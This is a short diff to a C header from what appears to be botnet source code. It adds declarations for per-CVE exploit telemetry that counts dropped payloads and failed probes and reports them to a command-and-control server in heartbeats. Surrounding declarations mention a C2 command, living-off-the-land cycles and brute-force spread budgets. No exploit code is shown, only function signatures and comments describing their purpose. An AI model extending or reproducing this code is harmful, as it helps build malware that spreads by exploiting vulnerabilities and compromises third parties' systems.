@@ -97,6 +97,16 @@ int lotl_run_cycle(notnet_bot_t *bot);
 /* #143: render CVE registry status for the C2 `cve list` command. */
 void cve_registry_status(char *buf, size_t len);
 
+/* #160: per-module telemetry. Counters live in the registry entries
+ * (hit = payload dropped, miss = probe/verify did not confirm,
+ * fail = drop exchange failed). cve_stats_render() emits the
+ * comma-separated "id:result=N" triplets (non-zero counters only)
+ * that protocol_send_heartbeat() reports to the C2 as cve_stats. */
+void cve_stats_hit(const char *id);
+void cve_stats_miss(const char *id);
+void cve_stats_fail(const char *id);
+void cve_stats_render(char *buf, size_t len);
+
 /* Set the per-command brute-force wall-clock budget in milliseconds
  * (#191). protocol.c calls this before invoking any spread vector.
  * Clamped to SPREAD_BUDGET_MIN_MS..SPREAD_BUDGET_MAX_MS. */
